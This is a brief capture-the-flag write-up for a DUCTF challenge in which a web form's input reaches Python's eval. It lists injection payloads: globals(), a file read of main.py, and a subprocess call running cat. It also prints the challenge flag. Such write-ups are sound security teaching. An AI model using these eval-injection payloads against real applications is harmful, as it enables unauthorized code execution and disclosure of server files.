# Addition

The user input from the form is being passed into the eval function which can be very dangerous.  

We can abuse eval by passing in `globals()` which will return the contents of the variables that contain the flag.

Although there are many different ways to get the flag, for e.g.

`open("main.py", "r").readlines()`

`__import__('subprocess').run(['cat', 'main.py'], capture_output=True)`

etc

## Payload
`globals()`

## Flag

DUCTF{3v4L_1s_D4ng3r0u5}
